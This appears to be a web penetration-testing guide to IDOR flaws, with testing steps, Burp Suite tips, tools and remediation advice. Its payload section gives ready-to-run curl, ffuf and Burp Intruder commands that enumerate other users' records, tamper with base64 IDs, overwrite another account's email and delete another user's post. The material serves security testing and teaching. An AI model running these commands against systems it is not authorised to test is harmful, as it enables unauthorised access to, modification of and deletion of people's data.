# IDOR — Insecure Direct Object Reference

## Overview
Insecure Direct Object Reference (IDOR) occurs when an application uses user-supplied input to directly access objects (database records, files, functions) without verifying that the requesting user is authorized to access that specific object. An attacker who discovers the object identifier format can substitute their own identifier for another user's, gaining unauthorized access to that user's data. IDOR is one of the most prevalent and impactful vulnerabilities in modern web applications and APIs.

## How It Works
- The application exposes object identifiers directly in URLs, API endpoints, or request parameters: `/api/orders/12345`, `/download?file_id=789`, `/profile?user_id=42`.
- The application retrieves the object associated with the identifier and returns it to the user without checking that the user owns or has permission to access that specific object.
- Identifiers may be numeric (sequential integers — easily enumerable), UUIDs (harder to enumerate but still vulnerable if the auth check is absent), or encoded values (base64, hash — a weak security-by-obscurity that doesn't replace proper authorization).
- IDOR can affect GET (data disclosure), POST (actions on others' objects), PUT/PATCH (modification), and DELETE operations.

## Impact
- Unauthorized data disclosure — read other users' personal data, messages, invoices, medical records.
- Unauthorized modification — change other users' account details, settings, or records.
- Unauthorized deletion — delete other users' data or resources.
- Privilege escalation — access admin functions or administrative records if admin object IDs are guessable.
- Mass data breach — automated enumeration extracts all user records.

## Where to Look
- URL path parameters: `/api/users/{id}`, `/api/invoices/{id}`, `/api/orders/{id}`.
- Query string parameters: `?account_id=123`, `?file=report_456.pdf`, `?ticket=789`.
- POST/PUT body parameters: `{"order_id": 1234}`, `{"user_id": 42}`.
- Hidden form fields.
- Cookie values containing user or object identifiers.
- Encoded values: base64 in URLs or parameters (decode to reveal underlying IDs).
- File download endpoints: `/files/download?name=invoice_123.pdf`.
- API responses that include object IDs for other objects (reference chains).

## Testing Steps
1. Create two test accounts (Account A and Account B) at different privilege levels.
2. With Account A, perform any action that involves an object identifier (view order, download file, view message).
3. Capture the request in Burp and note the object identifier (e.g., `order_id=1001`).
4. With Account B's session cookie, replay the request substituting Account A's object ID — observe if Account B can access Account A's object.
5. Enumerate IDs: increment/decrement the identifier by 1, 2, 5, 10 — observe which return valid data vs. 404/403.
6. Test all HTTP verbs: GET (read), PUT/PATCH (modify), DELETE on the same endpoint with substituted IDs.
7. Look for indirect object references: if `GET /api/me` returns user data, does `GET /api/users/42` return the same or more data without checking session?
8. Test encoded IDs: base64 decode identifiers in URLs or parameters — if they encode a user ID or object ID, try encoding a different value.
9. Test referencing IDs from different object types: can a regular user access admin-specific endpoints by guessing admin object IDs?

## Payloads / Techniques

Basic IDOR test with curl:
```bash
# Account A's session
TOKEN_A="session_token_for_account_a"
# Account B's session
TOKEN_B="session_token_for_account_b"

# Account A's order ID (obtained from Account A's session)
ORDER_ID_A=1001

# Test: Can Account B read Account A's order?
curl https://target.com/api/orders/$ORDER_ID_A \
  -H "Authorization: Bearer $TOKEN_B" \
  | python3 -m json.tool

# Test adjacent IDs
for id in $(seq 999 1005); do
  echo "Testing order $id:"
  curl -s https://target.com/api/orders/$id \
    -H "Authorization: Bearer $TOKEN_B" \
    -o /dev/null -w "%{http_code}\n"
done
```

Automated IDOR enumeration with ffuf:
```bash
ffuf -w ids.txt:FUZZ \
  -u https://target.com/api/users/FUZZ/profile \
  -H "Authorization: Bearer $TOKEN_B" \
  -fc 403,404 \
  -o idor_results.json -of json

# Generate sequential ID list
seq 1 1000 > ids.txt
```

Burp Intruder IDOR scan:
```
GET /api/invoices/§1001§ HTTP/1.1
Host: target.com
Authorization: Bearer ACCOUNT_B_TOKEN
# Payload: number sequence 1000-2000
```

Base64 IDOR:
```bash
# If parameter is: ?user=dXNlcl9pZD0xMjM=  (base64 of "user_id=123")
echo "dXNlcl9pZD0xMjM=" | base64 -d
# Decode -> "user_id=123", then try "user_id=1", "user_id=2", etc.
echo "user_id=1" | base64
# Submit the new encoded value
curl "https://target.com/profile?user=$(echo -n 'user_id=1' | base64)"
```

Test write/delete IDOR:
```bash
# Try modifying another user's resource
curl -X PUT https://target.com/api/users/42/email \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com"}'

# Try deleting another user's object
curl -X DELETE https://target.com/api/posts/9999 \
  -H "Authorization: Bearer $TOKEN_B"
```

UUID IDOR (harder but still test):
```bash
# Even with UUIDs, test if the auth check exists
UUID_FROM_ACCOUNT_A="550e8400-e29b-41d4-a716-446655440000"
curl https://target.com/api/documents/$UUID_FROM_ACCOUNT_A \
  -H "Authorization: Bearer $TOKEN_B"
```

## Burp Suite Tips
- Use **Intruder** (Sniper mode on the ID parameter, number payload 1–10000) to enumerate all objects — sort by response length to identify which IDs return data.
- The **Autorize** extension (BApp Store) is a game-changer for IDOR testing: configure Account B's session token, and it automatically retests every Account A request with Account B's token, flagging successful accesses.
- In **Proxy** history, use the search/filter to find all requests with `id=`, `user_id=`, `account=`, `file=` — each is an IDOR candidate.
- Use **Match and Replace** to automatically substitute the current user's ID with another test user's ID in all requests.
- The **IDOR Scanner** extension automatically identifies ID-containing parameters and tests adjacent values.
- **Comparer**: compare the full body of a response to your own profile vs. the response for another user's profile — differences confirm data leakage.

## Tools
- **Autorize** (Burp Extension) — Automated IDOR testing by replaying requests with a different user's session.
- **Burp Suite Intruder** — Sequential/UUID-based ID enumeration.
- **ffuf** — High-speed endpoint fuzzing for ID enumeration.
- **OWASP ZAP** — Access control testing functionality.
- **Python scripts** — Custom IDOR enumeration scripts with authentication token management.
- **Arjun** — HTTP parameter discovery to find hidden ID parameters.

## Remediation
- Implement authorization checks on every object access: verify that the authenticated user's ID/role matches the object's owner/ACL before returning or modifying data.
- Use indirect references: map user-specific object identifiers (e.g., a session-scoped list index) to actual database IDs server-side, so IDs in the URL are not directly usable across sessions.
- Never use sequential integer IDs as the only access control — always pair them with a server-side authorization check.
- Apply a consistent "get object + check ownership" pattern in all data access code.
- Implement automated tests that verify user A cannot access user B's resources (access control regression tests).
- Log and alert on access to objects not owned by the requesting user — unusual access patterns indicate IDOR exploitation.

## References
https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control
https://portswigger.net/web-security/access-control/idor
https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/639.html
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
